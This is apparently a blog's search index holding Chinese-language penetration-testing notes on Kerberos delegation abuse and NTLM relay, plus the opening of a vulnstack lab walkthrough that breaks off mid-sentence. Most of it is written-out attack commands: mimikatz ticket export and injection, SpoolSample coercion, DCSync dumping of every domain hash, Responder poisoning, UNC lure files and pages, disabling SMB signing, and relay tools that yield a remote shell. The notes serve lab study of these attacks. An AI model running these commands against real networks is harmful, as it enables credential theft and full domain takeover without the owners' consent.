<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>非约束委派和约束委派</title>
    <link href="/2025/01/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/"/>
    <url>/2025/01/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h1><h2 id="非约束性委派概述"><a href="#非约束性委派概述" class="headerlink" title="非约束性委派概述"></a>非约束性委派概述</h2><p>在Windows server 2000首次发布Active Directory时，Microsoft就提供了一种简单的机制来支持用户通过Kerberos向Web Server进行身份验证并需要代表该用户更新后端数据库服务器上的记录方案，这就是最早的<code>非约束性委派</code></p><p><strong>对于非约束性委派，服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可以使用该TGT，模拟该用户访问任何服务</strong></p><p>非约束委派的设置需要<code>SeEnableDelegation特权</code>，该特权通常仅授予域管理员</p><p>配置了非约束性委派属性的<code>机器账号</code>的<code>UserAccountControl属性</code>有个Flag位：<code>WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION</code>，其对应的数是<code>0x81000=528384</code></p><p>配置了非约束性委派属性的<code>服务账号</code>的<code>userAccountControl属性</code>有个Flag位：<code>NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION</code>，其对应的数是<code>0x80200=524800</code></p><h2 id="查找非约束委派的主机或服务账号"><a href="#查找非约束委派的主机或服务账号" class="headerlink" title="查找非约束委派的主机或服务账号"></a>查找非约束委派的主机或服务账号</h2><h3 id="利用powersploit中的powerview"><a href="#利用powersploit中的powerview" class="headerlink" title="利用powersploit中的powerview"></a>利用powersploit中的powerview</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">import-Module .\PowerView.ps1<br><br>Get-NetComputer -Unconstrained -Domain test.com<br>Get-NetUser -Unconstrained -Domain test.com | select name<br></code></pre></td></tr></table></figure><h3 id="利用ADFind"><a href="#利用ADFind" class="headerlink" title="利用ADFind"></a>利用ADFind</h3><h2 id="非约束性委派利用过程"><a href="#非约束性委派利用过程" class="headerlink" title="非约束性委派利用过程"></a>非约束性委派利用过程</h2><p>user访问serverA，于是向DC发起认证，DC会检查server的机器账号的属性，<code>如果是非约東委派的话，会把用户的TGT放在ST票据中并一起发送给ServerA</code>，这样ServerA在验证ST票据的同时也获得了用户的TGT，<code>并把TGT存储在自己的lsass进程中以备下次重用，从而ServerA就可以使用这个TGT，来模拟这个user访问任何服务</code></p><p>从攻击角度来说：<code>如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境</code></p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>域:test2.com 域控:PC2 受非约束委派机器:PC1</p><p>用域管访问PC1机器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">net <span class="hljs-keyword">use</span> <span class="hljs-title">MPC1</span>.<span class="hljs-title">test2</span> <span class="hljs-title">comlipc</span>$ &quot;<span class="hljs-title">admin</span>@2019<span class="hljs-title">Domain</span>&quot; /<span class="hljs-title">user</span>:<span class="hljs-title">test2</span>\<span class="hljs-title">administrator</span><br><br><span class="hljs-title">dir</span> <span class="hljs-title">WPc1</span> .<span class="hljs-title">test2</span>.<span class="hljs-title">com</span>\<span class="hljs-title">c</span>$<br></code></pre></td></tr></table></figure><p>然后在PC1上以管理员权限运行mimikatz</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">privilege::<span class="hljs-variable constant_">debug</span><br>sekurlsa::<span class="hljs-variable constant_">tickets</span> /export<br></code></pre></td></tr></table></figure><p>此时可以在mimikatz同级目录下拿到管理员Administrator的票据，用mimikatz将票据注入内存中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">privilege::<span class="hljs-variable constant_">debug</span><br>kerberos::<span class="hljs-variable constant_">purge</span><br>kerberos::<span class="hljs-variable constant_">ptt</span> [<span class="hljs-number">0</span>:a33838]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">60</span>a10000-Administrator@krbtgt-TEST2.COM.kirbi<br>kerberos::<span class="hljs-variable constant_">list</span><br></code></pre></td></tr></table></figure><p>成功访问域控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">dir \Pc2.test2.com\c$<br></code></pre></td></tr></table></figure><h2 id="非约束委派-Spooler打印机漏洞利用过程"><a href="#非约束委派-Spooler打印机漏洞利用过程" class="headerlink" title="非约束委派+Spooler打印机漏洞利用过程"></a>非约束委派+Spooler打印机漏洞利用过程</h2><p>非约束委派+spooler打印机服务可以强制指定的主机进行连接</p><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用Windows打印系统远程协议(MS-RPRN)中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRNRpcRemoteFindFirstPrinterchangeNotification方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证<br>Print Spooler服务默认是自动运行的</p><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><p>域:test2.com 域控:PC2 非约束委派机器:PC1</p><p>使用Rubeus监听来自域控的登陆日志</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Rubeus.exe monitor /interval:<span class="hljs-number">1</span> /filteruser:PC2<br></code></pre></td></tr></table></figure><p>在PC1上运行SpoolSample.exe，向域控的Spooler服务发送请求，强制域控PC2向PC1发起认证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SpoolerSample.exe PC2 PC1<br></code></pre></td></tr></table></figure><p>成功捕捉到域控的票据，利用Rubeus进行PTT票据传递</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Rubeus.exe ptt 票据内容<br></code></pre></td></tr></table></figure><p>票据导入成功后，利用DCSync导出域内所有用户的Hash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">Isadump</span>::<span class="hljs-variable constant_">dcsync</span> /domain:test2.com /all /csV<br></code></pre></td></tr></table></figure><p>然后可以根据获得的信息进一步进行Hash传递或进行黄金票据等</p><h1 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h1><h2 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h2><p>域名:test2.com 域控:PC2.test2.com 域内机器:PC1.test2.com 域内委派用户:justtest</p><p>首先在域控上将justtest注册为SPN服务账号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">setspn -S cifs/PC1.test2.com<br></code></pre></td></tr></table></figure><p>查看是否注册成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">setspn -L justtest<br></code></pre></td></tr></table></figure><p>然后将justtest用户设置为 约束委派 的属性，为访问域控的cifs</p><p>通过命令行打开<code>adsiedit.msc</code>查看<code>justtest</code>用户属性</p><p>可以看到当被设置为约束委派的时候，它的<code>userAccountControl</code>会包含<code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code>字段并且比<code>非约束委派</code>账户多了<code>msDS-AllowedToDelegateTo</code>字段，里面包含了允许委派的服务</p><p>当知道justtest这个服务用户的明文密码或者Hash时，可以用kekeo请求它的TGT</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tgt:ask /user:justtest /domain:test2.com /password:Seven@Six999.<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tot::<span class="hljs-variable constant_">ask</span> /user:justtest /domain:test2.com /NTLM XXXXXXXX<br></code></pre></td></tr></table></figure><p>如果不知道明文和Hash，如果有了服务用户登录的主机权限，也可以利用mimikatz从内存中把服务用户的TGT dump下来，从内存中导出所有票据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">privilege:debug<br>sekurlsa:tickets /export<br></code></pre></td></tr></table></figure><p>然后通过justtest的TGT伪造s4u请求以administrator身份请求访问域控cifs的ST</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tgs s4u /tgt.TGT justtest@TEST2.COM krbtgt.test2.com@TEST2.COM.kirbi /user administrator@test2 com/service:cifs/Pc2 test2.com<br></code></pre></td></tr></table></figure><p>可以获得两个票据<br>用mimikatz将票据导入内存中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">kerberos:ptt TGS administrator@test2.com@TEST2.COM cifs~PC2 test2.com@TEST2.COM .kirbi<br></code></pre></td></tr></table></figure><p>访问域控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">dir WPc2.test2.com\c$<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网横向</tag>
      
      <tag>渗透</tag>
      
      <tag>委派攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NTLM中继攻击</title>
    <link href="/2025/01/22/NTLM%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/"/>
    <url>/2025/01/22/NTLM%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="NTLM中继攻击原理"><a href="#NTLM中继攻击原理" class="headerlink" title="NTLM中继攻击原理"></a>NTLM中继攻击原理</h1><p>之前说过hash的分类，简单分为<code>LM hash</code>、<code>Net-NTLM Hash v1</code>和<code>Net-NTLM Hash v2</code></p><p>现在一般都是<code>Net-NTLM Hash v2</code>，破解和爆破都比较困难，所以一般获取不到明文</p><p><code>ntlm relay</code>的原理可以简述为：存在一个中间人，也就是攻击者，然后客户端认为他是服务端，服务端认为他是客户端。所以全程客户端都在和攻击者进行交互，然后攻击者将获得到的信息拿来和服务端交互，所以服务端认为攻击者是客户端，这样也就达到了伪造客户端进行认证的目的</p><p><img src="/img/NTLM%E4%B8%AD%E7%BB%A73.png" alt="img"></p><p><code>Net-Ntlm relay</code>攻击的大致思路就是在<code>Ntlm协议认证的第三步</code>，通过获取<code>Hash</code>值，然后进行重放到服务器上进行验证。所以我们这里大致分为两步：第一步是获得Net-Ntlm Hash值，第二步是进行重放</p><h1 id="获取Net-ntlm-hash"><a href="#获取Net-ntlm-hash" class="headerlink" title="获取Net-ntlm hash"></a>获取Net-ntlm hash</h1><p>这里的实现方式就是让受害者把<code>Hash</code>传递给自己，所以说我们可以利用所有基于<code>NTLM</code>协议的上层协议进行<code>relay</code>，比如<code>SMB</code>、<code>HTTP</code>、<code>LDAP</code>协议</p><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><p>这两个工具的原理是<code>LLMNR</code>和<code>NetBIOS欺骗</code></p><blockquote><p><code>LLMNR</code>全称链路本地多播名称解析，是基于域名系统（<code>DNS</code>）数据包格式的协议，<code>IPv4</code>和<code>IPv6</code>的主机可以通过此协议对同一本地链路上的主机执行名称解析。简单理解为就是一种在局域网内寻找主机的协议</p></blockquote><blockquote><p><code>NetBios</code>全称网络基本输入输出系统，它提供了<code>OSI</code>模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。<code>NetBIOS</code>也是计算机的标识名称，主要用于局域网内计算机的互访。<code>NetBIOS</code>的工作流程就是正常的机器名解析查询应答过程。在<code>Windows</code>操作系统中，默认情况下在安装<code>TCP/IP</code>协议后会自动安装<code>NetBIOS</code></p></blockquote><p><code>Windows</code>解析主机名的顺序为：</p><ol><li>查看本地<code>hosts</code>文件</li><li>查看<code>DNS</code>缓存或者<code>DNS</code>服务器中进行查找</li><li>利用<code>LLMNR</code>（链路本地多播名称解析）和<code>NetBIOS</code>名称服务进行查找</li></ol><p>在局域网环境下，当用户输入了一个不存在的，或者错误的，<code>DNS</code>中不存在的主机名的时候，<code>Windows</code>系统根据主机名解析的顺序开始查找，最终在局域网内广播<code>LLMNR/NBNS</code>数据包来请求解析主机名。所以当我们在<strong>攻击机上进行监听</strong>，然后在<strong>被攻击机上进行广播</strong>查找，当<code>LLMNR</code>（链路本地多播名称解析）和<code>NetBIOS</code>名称服务进行查找时，我们就可以抓到<strong>被攻击机的Hash</strong></p><p>下载链接：<a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p>然后我们在攻击机（kali）上执行下面的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">sudo responder -I eth0  -v -F on -w on <br><br><br>-I eth0: 指定要监听的网络接口<br>-v: 输出详细的调试信息。<br>-F on: 打开 NTLMv1/NTLMv2/LMv2/Fallback 密码哈希的抓取和中继功能。<br>-w on: 打开 WPAD 代理欺骗功能。<br></code></pre></td></tr></table></figure><p>然后在<strong>被攻击机</strong>上访问一个<strong>不存在的主机</strong>，使得<strong>被攻击机</strong>进行广播，这里随便输一个<code>\\dddddd</code><br>或者在终端执行<code>net use \\dddddd</code>，这里是利用SMB协议进行中继攻击，所以这里是SMB Relay</p><p>其实这里的原理是<code>LLMNR&amp;NBNS</code>攻击，当用户输入任意一个不存在的名称，<strong>本地hosts文件和DNS服务器均不能正常解析该名称</strong>，所以系统就会发送<code>LLNMR/NBNS</code>数据包请求解析，此时Responder对目标主机进行<code>LLNMR/NBNS</code>毒化，并要求其输入凭据认证，然后就可以抓到目标机器的<code>Net-Ntlm hash</code></p><h2 id="desktop-ini"><a href="#desktop-ini" class="headerlink" title="desktop.ini"></a>desktop.ini</h2><p>每个文件夹下都有个隐藏文件<code>desktop.ini</code>其作用来用来指定文件夹图标等，正常情况是不可见的，可以通过<strong>修改文件夹属性</strong>去显示此文件<br>当图标的一些路径改成指定的<strong>UNC路径</strong>，就能收到目标机器发来的NTLM请求</p><blockquote><p>通用命名规则 UNC (Universal Naming Convention) ，也叫通用命名规范、通用命名约定，指用一种通用语法来描述网络资源（如共享文件，目录或打印机）的位置<br>Microsoft Windows UNC，通用命名约定或统一命名约定的简称，指定了一种通用语法来描述网络资源（如共享文件，目录或打印机）的位置。Windows系统的UNC语法具有通用形式：<br><code>\\ComputerName\SharedFolder\Resource</code></p></blockquote><p>我们先新建一个文件夹<code>111</code>，然后随便修改一个文件夹图标</p><p>取消勾选<code>隐藏受保护的操作系统文件</code></p><p>此时可以看到<code>desktop.ini</code>文件</p><p>然后将该文件里的<code>UNC路径</code>替换为<code>指定机器的UNC路径</code>，这样当有人访问了<code>111</code>文件夹，目标机器就会去请求指定的UNC的图标资源，于是该机器就会将当前用户的<code>Net-NTLM Hash</code>发送给指定UNC的机器，我们在攻击机上用<code>Responder</code>监听，就能接受到发来的<code>Net-NTLM Hash</code></p><p><img src="/img/NTLM%E4%B8%AD%E7%BB%A74.png" alt="image-20241026171148304"></p><h2 id="scf后缀文件"><a href="#scf后缀文件" class="headerlink" title=".scf后缀文件"></a>.scf后缀文件</h2><blockquote><p>SCF后缀的文件通常是Windows操作系统中使用的一种快捷方式文件。SCF文件是Shell Command File（Shell 命令文件）的缩写，它包含了一系列命令，用于执行特定的操作或打开特定的应用程序</p></blockquote><p>这个利用方法和上面的<code>desktop.ini</code>的原理是一样的，<code>.scf</code>文件中包含<code>IconFile</code>属性，所以<code>explore.exe</code>服务器会尝试获取文件夹的图标，所以打开<code>.scf</code>所在的文件夹时，目标机器会尝试获取文件夹的图标，那我们通过修改<code>IconFile</code>也就像上面一样达到访问指定UNC机器的目的了</p><p><code>.scf</code>文件的基本格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">[Shell]Command=<span class="hljs-number">2</span><br>IconFile=\\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.2</span>\test\test.ico<br>[Taskbar]<br>Command=ToggleDesktop<br></code></pre></td></tr></table></figure><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p>当浏览器的访问页面含有UNC路径时，浏览器在解析该页面时也会尝试请求该UNC地址，发起NTLM认证。不同的浏览器有不同的UNC路径格式</p><p>这里示范一下在IE浏览器下的。在网站(phpstudy)下新建 1.html ，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!doctype html&gt;<br>&lt;htlm lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>&lt;head&gt;<br>&lt;body&gt;<br>   &lt;script src=<span class="hljs-string">&quot;\\192.168.253.255\test&quot;</span>&gt;&lt;/script&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后在被攻击机上访问这个文件，成功抓到<code>Net-NTLM Hash</code></p><h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><p>下面列举一些常见的系统命令来访问指定的UNC路径去触发<code>Net-NTLM Hash</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">net.exe <span class="hljs-keyword">use</span> \<span class="hljs-title">hostshare</span><br><span class="hljs-title">attrib</span>.<span class="hljs-title">exe</span> \<span class="hljs-title">hostshare</span><br><span class="hljs-title">cacls</span>.<span class="hljs-title">exe</span> \<span class="hljs-title">hostshare</span><br><span class="hljs-title">cipher</span>.<span class="hljs-title">exe</span> \<span class="hljs-title">hostshare</span><br><span class="hljs-title">expand</span>.<span class="hljs-title">exe</span> \<span class="hljs-title">hostshare</span><br></code></pre></td></tr></table></figure><p>然后<code>Responder</code>监听接收到了hash值</p><p>除了上面的这些方法之外还可以用<code>Office</code>、<code>PDF</code>、<code>outlook</code>、<code>WPAD欺骗</code>、<code>打印机漏洞</code>等</p><h1 id="利用Net-ntlm-hash进行攻击"><a href="#利用Net-ntlm-hash进行攻击" class="headerlink" title="利用Net-ntlm hash进行攻击"></a>利用Net-ntlm hash进行攻击</h1><h2 id="破解Net-NTLM-Hash"><a href="#破解Net-NTLM-Hash" class="headerlink" title="破解Net-NTLM Hash"></a>破解Net-NTLM Hash</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">hashcat -m <span class="hljs-number">5600</span> &lt;net-ntlm hash&gt; 密码字典路径 --force --show <br><br>比如：（主要看字典强不强大）<br>hashcat -m <span class="hljs-number">5600</span>  <span class="hljs-title class_">Administrator</span>::<span class="hljs-variable constant_">WANYUE</span>:cc1c3f0693127e2d:F1A956FBA8F6138DD687620F161C6CDA:<span class="hljs-number">010100000000000054</span>EA5D5C6D49DA0163E3AABCA31110450000000002000800420053004F00470001001E00570049004E002D005400580045004B004400310051004C0049003600570004001400420053004F0047002E004C004F00430041004C0003003400570049004E002D005400580045004B004400310051004C004900360057002E00420053004F0047002E004C004F00430041004C0005001400420053004F0047002E004C004F00430041004C000800300030000000000000000000000000300000AB1E45D172BBDC200072E4A485AB24C52F15C1CA212FB8F124D857356EFE126F0A001000000000000000000000000000000000000900120048005400540050002F0077007000610064000000000000000000 /password.txt --force --show<br></code></pre></td></tr></table></figure><p>我们抓到的这个是<code>Net-NTLM Hash v2</code>，密码强度较高，一般都跑不出来，所以基本都是用中继攻击</p><h2 id="中继Net-NTLM-Hash"><a href="#中继Net-NTLM-Hash" class="headerlink" title="中继Net-NTLM Hash"></a>中继Net-NTLM Hash</h2><p>我们知道，由于NTLM只是底层的认证协议，必须镶嵌在上层应用协议里面，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP、LDAP等。因此，我们可以将获取到的<code>Net-NTLM Hash</code> Relay到其他使用NTLM进行认证的应用上</p><blockquote><p>攻击前提：</p><p>目标主机没有开启smb签名。一般情况下域控默认开启smb签名，其余域内机器不开启</p></blockquote><p>关闭SMB签名的命令如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d <span class="hljs-number">0</span> /f<br></code></pre></td></tr></table></figure><p>用nmap探测SMB签名是否打开命令(不一定准确)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nmap -p445 --script=smb-security-mode.nse -Pn IP地址 --open<br></code></pre></td></tr></table></figure><h3 id="Relay-To-SMB"><a href="#Relay-To-SMB" class="headerlink" title="Relay To SMB"></a>Relay To SMB</h3><p>SMB-Relay又分为在<code>工作组环境</code>下和在<code>域环境</code>下，但是一般工作组环境下比较少</p><ol><li>工作组环境：在工作组环境中，工作组中的机器之间相互没有信任关系，每台机器的账号密码只是保存在自己的SAM文件中，这个时候Relay到别的机器，<strong>除非两台机器的账号密码一样</strong>，不然没有别的意义了。但是如果账号密码相同的话，为何不直接<code>Pass The Hash</code>攻击呢？因此在工作组环境下，Relay到其他机器不太现实。这个时候的攻击手段就是将机器Relay回机子本身。因此微软在<code>ms08-068</code>中对Relay到自身机器做了限制，严禁Relay到机器自身。<code>CVE-2019-1384(Ghost Potato)</code>就是绕过了该补丁。</li><li>域环境：在域环境中，默认普通域用户可以登录除域控外的其他所有机器(但是为了安全，企业运维人员通常会限制域用户登录的主机)，因此可以将<code>Net-NTLM Hash Relay</code>到域内的其他机器。如果是拿到了域控机器的<code>Net-NTLM Hash</code>，可以Relay到除域控外的其他所有机器(为啥不Relay到其他域控，因为域内只有域控默认开启SMB签名)。</li></ol><h4 id="responder-MultiRelay"><a href="#responder-MultiRelay" class="headerlink" title="responder MultiRelay"></a>responder MultiRelay</h4><p>利用 MultiRelay.py 攻击，获得目标主机的 shell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">python3 MultiRelay.py -t &lt;被攻击ip&gt; -u ALL<br>    <br>python3 MultiRelay.py -t <span class="hljs-number">192.168</span>.<span class="hljs-number">58.145</span> -u ALL<br></code></pre></td></tr></table></figure><p>现在 SMB 已经由 MultiRelay.py 脚本来进行中继，我们需要修改一下 responder 的配置文件Responder.conf，不让其对 hash 进行抓取。将 SMB 和 HTTP 的 On 改为 Off：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">vim /usr/share/responder/Responder.conf<br><br>SMB=Off<br>HTTP=Off<br></code></pre></td></tr></table></figure><p>重启 Responder.py，准备毒化（这里 responder 的作用就是当访问一个不存在的共享路径，将称解析降到 LLMNR&#x2F;NBNS 时，来抓取网络中所有的 LLMNR 和 NetBIOS 请求并进行响应）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">responder -I eth0<br></code></pre></td></tr></table></figure><p>在 DC（192.168.58.144）上随便传递一个 SMB 流量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">net <span class="hljs-keyword">use</span> \\<span class="hljs-title">whoami</span><br></code></pre></td></tr></table></figure><p>可以看到已经拿到了目标机器的 shell</p><p><img src="/img/NTLM%E4%B8%AD%E7%BB%A71.png" alt="image-20241026150324109"></p><h4 id="Impacket-smbrelayx"><a href="#Impacket-smbrelayx" class="headerlink" title="Impacket smbrelayx"></a>Impacket smbrelayx</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">impacket-smbrelayx -h &lt;被攻击ip&gt; -c whoami<br><br>python smbrelayx.py -h <span class="hljs-number">192.168</span>.<span class="hljs-number">58.145</span> -c whoami<br></code></pre></td></tr></table></figure><p>让任意主机访问这个攻击者精心构造好的 SMB 服务器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">net <span class="hljs-keyword">use</span> \\&lt;<span class="hljs-title">kali</span> <span class="hljs-title">IP</span>&gt;<br>    <br><span class="hljs-title">net</span> <span class="hljs-title">use</span> \\192.168.58.147<br></code></pre></td></tr></table></figure><p>此时，攻击者的 smbrelayx 脚本上就会发现命令成功执行了</p><p><img src="/img/NTLM%E4%B8%AD%E7%BB%A72.png" alt="image-20241026160430334"></p><h4 id="Impacket-ntlmrelayx-py"><a href="#Impacket-ntlmrelayx-py" class="headerlink" title="Impacket ntlmrelayx.py"></a>Impacket ntlmrelayx.py</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python ntlmrelayx.py -t <span class="hljs-number">192.168</span>.<span class="hljs-number">58.145</span> -c whoami -smb2support<br></code></pre></td></tr></table></figure><p><img src="/img/NTLM%E4%B8%AD%E7%BB%A75.png" alt="image-20241026181305398"></p><h3 id="Relay-To-HTTP"><a href="#Relay-To-HTTP" class="headerlink" title="Relay To HTTP"></a>Relay To HTTP</h3><p>中继到HTTP协议，基本都是用上面SMB说的三个脚本，这三个脚本也可以应用到HTTP协议中，就像impacket下的smbrelayx.py最后中继到http协议的一样，一般就是在域内的一台主机上访问一个不存在的网页，然后输入凭证</p><p>所以只要我们开始欺骗投毒并且运行脚本之后，只要域内有机器用到了SMB或者HTTP协议就会触发，使得我们成功横向移动</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NTLM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场vulnstack1实战笔记</title>
    <link href="/2024/08/03/domain2/"/>
    <url>/2024/08/03/domain2/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>靶场下载链接：</strong><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p><strong>参考链接：</strong><a href="https://www.cnblogs.com/1vxyz/p/17201316.html">https://www.cnblogs.com/1vxyz/p/17201316.html</a></p><p><a href="https://blog.csdn.net/weixin_46022776/article/details/139295589">https://blog.csdn.net/weixin_46022776/article/details/139295589</a></p><p><strong>拓扑图：</strong></p><p><img src="/img/domain2_1.png" alt="domain2_1"></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong>目标IP：</strong>192.168.170.139</p><p><strong>DMZ-Windows7：</strong></p><p>网卡1（NAT，相当于外网）：192.168.170.139</p><p>网卡2（仅主机，相当于内网）：192.168.52.143</p><p><strong>DC-WindowsServer2008：</strong></p><p>网卡（仅主机，相当于内网）：192.168.52.138</p><p><strong>域成员-Windows2K3：</strong></p><p>网卡（仅主机，相当于内网）：192.168.52.141</p><h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>按照宇宙惯例对目标IP进行扫描，发现其80、3306等端口均开放</p><p><img src="/img/domain2_1.png" alt="domain2_2"></p><p>使用dirsearch对目标目录进行爆破，发现存在<code>/phpmyAdmin</code></p><p><img src="/img/domain2_1.png" alt="domain2_3"></p><p>尝试使用弱口令<code>root/root</code>直接登入</p><h2 id="phpmyadmin后台getshell"><a href="#phpmyadmin后台getshell" class="headerlink" title="phpmyadmin后台getshell"></a>phpmyadmin后台getshell</h2><p>phpmyadmin存在以下两种getshell的方式：</p><ul><li>into 